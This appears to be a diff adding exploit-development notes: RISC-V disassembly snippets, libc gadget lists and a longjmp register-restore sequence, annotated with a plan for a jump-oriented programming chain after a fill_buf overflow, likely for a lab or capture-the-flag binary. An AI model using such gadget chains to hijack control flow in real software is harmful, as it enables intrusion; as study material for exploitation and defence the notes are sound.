@@ -1,0 +1,179 @@
+a.disas:
+    fill_buf end - loads s0 from the stack and ret address from stack
+
+    90e:	fc843783          	ld	a5,-56(s0)
+    912:	853e                	mv	a0,a5
+    9ea:	70e2                	ld	ra,56(sp)
+    916:	7442                	ld	s0,48(sp)
+    918:	6121                	addi	sp,sp,64
+    91a:	8082                	ret
+    
+
+    call function pointer after fill_buf: load function pointer from s0 and jump to it
+    9dc:	fe043783          	ld	a5,-32(s0)
+    9e0:	fc843503          	ld	a0,-56(s0)
+    9e4:	9782                	jalr	a5
+
+    Point a0 to dispatch buf.
+    jalr to a5 to start jop chain
+    Load s3 from *a0 or *s0
+
+    load t3 from t2
+    t0 = *(t2-1768 + 8)
+    jump to t3
+    6f8:	9183be03          	ld	t3,-1768(t2) # 2008 <__TMC_END__>
+    6fc:	fd430313          	addi	t1,t1,-44
+    700:	91838293          	addi	t0,t2,-1768
+    704:	00135313          	srli	t1,t1,0x1
+    708:	0082b283          	ld	t0,8(t0)
+    70c:	000e0067          	jr	t3
+
+libc.disas:
+   55e28:	83ce                	mv	t2,s3
+   55e2a:	8682                	jr	a3
+
+fill_buf end - loads s0 from the stack and ret address from stack
+Have control of a0, and s0
+
+Gain control of s3 from s0 and continue JOP
+Loads s3 from s0
+Loads a5 from s3
+Jumps to a5
+   58420:	0d843983          	ld	s3,216(s0)
+   58424:	000b0797          	auipc	a5,0xb0
+   58428:	14478793          	addi	a5,a5,324 # 108568 <stdin@@GLIBC_2.27+0x100>
+   5842c:	000b1717          	auipc	a4,0xb1
+   58430:	d0c70713          	addi	a4,a4,-756 # 109138 <_IO_file_jumps@@GLIBC_2.27+0x2a0>
+   58434:	8f1d                	sub	a4,a4,a5
+   58436:	40f987b3          	sub	a5,s3,a5
+   5843a:	06e7f963          	bgeu	a5,a4,584ac <_IO_fputs@@GLIBC_2.27+0xe0>
+   5843e:	0389b783          	ld	a5,56(s3) # 1038 <__h_errno@@GLIBC_PRIVATE+0xfc4>
+   58442:	8626                	mv	a2,s1
+   58444:	85ca                	mv	a1,s2
+   58446:	8522                	mv	a0,s0
+   58448:	9782                	jalr	a5
+
+Gadgets to set registers from longjmp:
+   2538c:	86a2                	mv	a3,s0
+   2538e:	9c82                	jalr	s9
+   
+   2590a:	86de                	mv	a3,s7
+   2590c:	9d02                	jalr	s10
+
+   25e06:	86da                	mv	a3,s6
+   25e08:	866e                	mv	a2,s11
+   25e0a:	9a82                	jalr	s5
+
+   262e0:	86e6                	mv	a3,s9
+   262e2:	866e                	mv	a2,s11
+   262e4:	9a02                	jalr	s4
+
+   267ee:	86a2                	mv	a3,s0
+   267f0:	8662                	mv	a2,s8
+   267f2:	9a02                	jalr	s4
+
+   284be:	86a2                	mv	a3,s0
+   284c0:	866e                	mv	a2,s11
+   284c2:	9a82                	jalr	s5
+
+   25e06:	86da                	mv	a3,s6
+   25e08:	866e                	mv	a2,s11
+   25e0a:	9a82                	jalr	s5
+
+   267ee:	86a2                	mv	a3,s0
+   267f0:	8662                	mv	a2,s8
+   267f2:	9a02                	jalr	s4
+
+   28b28:	86ee                	mv	a3,s11
+   28b2a:	10b0                	addi	a2,sp,104
+   28b2c:	9b02                	jalr	s6
+
+   29570:	86e2                	mv	a3,s8
+   29572:	866a                	mv	a2,s10
+   29574:	9a02                	jalr	s4
+
+This one!!!
+   2538c:	86a2                	mv	a3,s0
+   2538e:	9c82                	jalr	s9
+
+Prerequisite: need control of a3
+   55e24:	82ce                	mv	t0,s3
+   55e26:	8682                	jr	a3
+
+   6000a:	6942                	ld	s2,16(sp)
+   6000c:	64e2                	ld	s1,24(sp)
+   6000e:	6145                	addi	sp,sp,48
+   60010:	8782                	jr	a5
+
+   ccc66:	7402                	ld	s0,32(sp)
+   ccc68:	70a2                	ld	ra,40(sp)
+   ccc6a:	64e2                	ld	s1,24(sp)
+   ccc6c:	6942                	ld	s2,16(sp)
+   ccc6e:	69a2                	ld	s3,8(sp)
+   ccc70:	6a02                	ld	s4,0(sp)
+   ccc72:	6145                	addi	sp,sp,48
+   ccc74:	8782                	jr	a5
+
+
+   27e50:	8352                	mv	t1,s4
+   27e52:	6a4a                	ld	s4,144(sp)
+   27e54:	4701                	li	a4,0
+   27e56:	4681                	li	a3,0
+   27e58:	4601                	li	a2,0
+   27e5a:	6129                	addi	sp,sp,192
+   27e5c:	8302                	jr	t1
+   
+   2870a:	8356                	mv	t1,s5
+   2870c:	6aaa                	ld	s5,136(sp)
+   2870e:	4701                	li	a4,0
+   28710:	4681                	li	a3,0
+   28712:	4601                	li	a2,0
+   28714:	6129                	addi	sp,sp,192
+   28716:	8302                	jr	t1
+
+longjmp:
+   32494:	00053083          	ld	ra,0(a0)
+   32498:	6500                	ld	s0,8(a0)
+   3249a:	6904                	ld	s1,16(a0)
+   3249c:	01853903          	ld	s2,24(a0)
+   324a0:	02053983          	ld	s3,32(a0)
+   324a4:	02853a03          	ld	s4,40(a0)
+   324a8:	03053a83          	ld	s5,48(a0)
+   324ac:	03853b03          	ld	s6,56(a0)
+   324b0:	04053b83          	ld	s7,64(a0)
+   324b4:	04853c03          	ld	s8,72(a0)
+   324b8:	05053c83          	ld	s9,80(a0)
+   324bc:	05853d03          	ld	s10,88(a0)
+   324c0:	06053d83          	ld	s11,96(a0)
+   324c4:	06853103          	ld	sp,104(a0)
+   324c8:	3920                	fld	fs0,112(a0)
+   324ca:	3d24                	fld	fs1,120(a0)
+   324cc:	08053907          	fld	fs2,128(a0)
+   324d0:	08853987          	fld	fs3,136(a0)
+   324d4:	09053a07          	fld	fs4,144(a0)
+   324d8:	09853a87          	fld	fs5,152(a0)
+   324dc:	0a053b07          	fld	fs6,160(a0)
+   324e0:	0a853b87          	fld	fs7,168(a0)
+   324e4:	0b053c07          	fld	fs8,176(a0)
+   324e8:	0b853c87          	fld	fs9,184(a0)
+   324ec:	0c053d07          	fld	fs10,192(a0)
+   324f0:	0c853d87          	fld	fs11,200(a0)
+   324f4:	0015b513          	seqz	a0,a1
+   324f8:	952e                	add	a0,a0,a1
+   324fa:	8082                	ret
+
+
+
+s0 -> a3 -> jr a3
+s4 -> mv t0 gadget
+s3 -> dispatchbuf.txt
+   267ee:	86a2                	mv	a3,s0
+   267f0:	8662                	mv	a2,s8
+   267f2:	9a02                	jalr	s4
+   
+Prerequisite: need control of a3
+   55e24:	82ce                	mv	t0,s3
+   55e26:	8682                	jr	a3
+   
+Can either jump from ret, or use overwritten function pointer from s0
+have control of a0 and s0 points to our buffer somewhere
